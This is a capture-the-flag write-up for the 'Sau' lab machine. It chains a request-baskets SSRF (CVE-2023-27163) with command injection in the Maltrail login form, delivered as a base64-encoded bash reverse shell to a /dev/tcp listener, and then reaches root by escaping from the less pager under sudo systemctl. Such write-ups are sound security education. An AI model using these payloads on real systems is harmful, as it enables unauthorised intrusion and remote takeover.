# Sau

**Target:** 10.129.229.26

---

## Enumeration

As per usual, I'll begin with an nmap scan to identify the open ports.

### Port Enumeration

```bash
nmap -p- --min-rate 5000 -oA /enum/scans/ports 10.129.229.26
```

**Results**

```text
PORT      STATE     SERVICE
22/tcp    open      ssh
80/tcp    filtered  http
8338/tcp  filtered  unknown
55555/tcp open      unknown
```

Making an assumption based on these results, I'd guess port 80 holds some value.
Next, what do the services uncover? I'll only enumerate the open ports this way for now to keep the findings concise.

### Service Enumeration

```bash
nmap -p22,55555 --min-rate 5000 -sV -sC -oA /enum/scans/svc 10.129.229.26
```

**Results**

```text
PORT      STATE     SERVICE VERSION
22/tcp    open      ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
55555/tcp open      http    Golang net/http server
```

A golang server! I wonder why this is on 55555?
Now to identify some more of the technologies and functions of this server.

---

## Web Enumeration

Whatweb is never a bad place to start.

```bash
whatweb 10.129.229.26:55555
```

**Results**

```text
[302 Found] RedirectLocation[/web]

/web [200 OK]
Bootstrap[3.3.7]
JQuery[3.2.1]
Title[Request Baskets]
```

Very little information here so I'll take a look at the page next.

### Request Baskets

Web page:

http://10.129.229.26:55555/web

Application:

**request-baskets 1.2.1**

Source:

https://github.com/darklynx/request-baskets

### Findings

The first thing that stands out is the software and version number.
This is an unfamiliar software to me so I'll have a quick look at the source on github and discover the likely use of a SQL database. Good to keep in mind. Next I'll research any known vulnerabilities.

Almost immediately I find that the application version is vulnerable to: **CVE-2023-27163 (SSRF)**

Looking around a bit more I find that the `/web/baskets` page contains the message:

> "By providing the master token you will gain access to all baskets."

Not yet sure if this is helpful, but knowing there is a master token is generally beneficial.

Next I'll explore this CVE and see where it gets me.

---

## Exploitation

I'll have to explain the exact process involved here at a later date, maybe add it at the bottom.
For now: this poc by entr0pie effectively creates a tunnel from the webserver you have access to and points it at (in this case) an internal server. This is exactly what we need to potentially expose the contents of the filtered port 80.
Time to give it a crack.

### CVE-2023-27163

PoC:

https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh

### Payload Structure

```json
{
  "forward_url": "$ATTACKER_SERVER",
  "proxy_response": true,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```

### Core Request

```bash
curl -s -X POST \
-H 'Content-Type: application/json' \
-d "PAYLOAD" "API_URL"
```

### Testing Access to Filtered Port 80

After replacing the placeholder values with the respective ones for this scenario, I'll attempt the exploit.

```bash
./CVE.sh http://10.129.229.26:55555 http://127.0.0.1:80
```

**Result**

```text
Maltrail webpage loaded
```

And it provides a Maltrail webpage!

### Testing Access to Port 8338

I'll also attempt to have a look at the filtered port 8338 in case of any other content.

```bash
./CVE.sh http://10.129.229.26:55555 http://127.0.0.1:8338
```

**Result**

```text
Maltrail webpage loaded
```

It actually shows the same thing. Curious.

As a side note: it's also possible to view the same thing by requesting the basket provided by the CVE in the webpage interface itself.

Now I can move on to enumerating this page.

---

## Web Enumeration Pt.2 (Maltrail)

Upon loading the webpage, again, I see a version number.

### Findings

Application:

```text
Maltrail v0.53
```

And find an endpoint where we can test some basics like admin:admin or admin:password.

Login endpoint:

```text
/login
```

Response:

```text
Login Failed.
```

No dice.

I'll look into the version number of Maltrail, hunting for known vulnerabilities.

Very quickly I find a public exploit regarding unauthenticated command execution through an unsanitized username parameter.
This sounds like exactly what I need.

---

## Exploitation Pt.2 (Maltrail)

Again, to set up the tunnel:

### Accessing the Login Page

```bash
./CVE.sh http://10.129.229.26:55555 http://127.0.0.1:80/login
```

Or through the basket settings page:

```text
http://10.129.229.26:55555/rgkklb
```

I'll create a payload through a method taught by Ippsec's educational writeup videos. Very practical payload and process to memories. The goal is to create a base64 encoded bash command that makes a callback to a listener on your host machine. During the injection phase I'll command the application to decode the string.

### Creating the Payload

```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.57/9001 0>&1' | base64 -w0
```

**Output**

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny85MDAxIDA+JjE=
```

Additional spaces are added in the suspect places of "+" to remove problematic characters and simplify execution.

### Final Payload

```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.57/9001 0>&1 ' | base64 -w0
```

**Output**

```text
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTcvOTAwMSAgMD4mMSAg
```

Here is the final payload, base64 encoded.

### Listener

```bash
nc -lvnp 9001
```
My listener of choice.

### Sending the Payload

Now putting the theory to practice, I'll use curl to make the request

```bash
curl http://10.129.229.26:55555/rgkklb/ \
-d 'username=;`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTcvOTAwMSAgMD4mMSAg | base64 -d | bash`'
```

**Note**

The backticks are essential due to them forcing the command substitution to execute.

**Result**

```text
puma@sau:/opt/maltrail$
```

And I get a hit on the listener!

---

## Post-Exploitation (Local Enumeration)

### Shell Stabilisation

As is good practice to avoid errors, I'll stabilise the shell using a method taught again by Ippsec.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
ctrl+z
```

```bash
stty raw -echo; fg
```

```bash
export TERM=xterm
```

This makes the reverse shell terminal function mostly like the host terminal.

### User Flag

Now I'll look around the home directory for the flag.

```bash
cat /home/puma/user.txt
```

```text
<REDACTED>
```

Bingo!

### System Information

Now I'll get some information to start basing a privilege escalation idea from.

```bash
hostname
```

```text
sau
```

```bash
uname -a
```

```text
Linux sau 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Nothing super interesting here.

### Sudo Privileges

I'll check what I can achieve via sudo privileges too. Another great early check.

```bash
sudo -l
```

**Results**

```text
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Turns out there is something, and it's pretty golden loot!

---

## Privilege Escalation

GTFOBins will be the best friend of anyone finding an unfamiliar executable for privilege escalation. That would be me.

### GTFOBins

Essentially the goal is to use the sudo command to exploit the built-in functionality of "less" in status. Less loads the content and from here a terminal can be called by using "!sh" spawning terminal. With root having executed the initial command, this nested process is also being executed by root, meaning this terminal should have root privileges!

```bash
sudo /usr/bin/systemctl status trail.service
```

Within the `less` pager:

```bash
!sh
```

### Root Shell

```bash
whoami
```

**Result**

```text
root
```

Viola! (Excuse my French)

### Root Flag

From here I can pick up the flag from the root directory.

```bash
cat /root/root.txt
```

```text
<REDACTED>
```

Note:
This point is the end of the box but not the end of the notes. Down the line I'll be exploring the details of the CVE as a code review which will likely end up here.
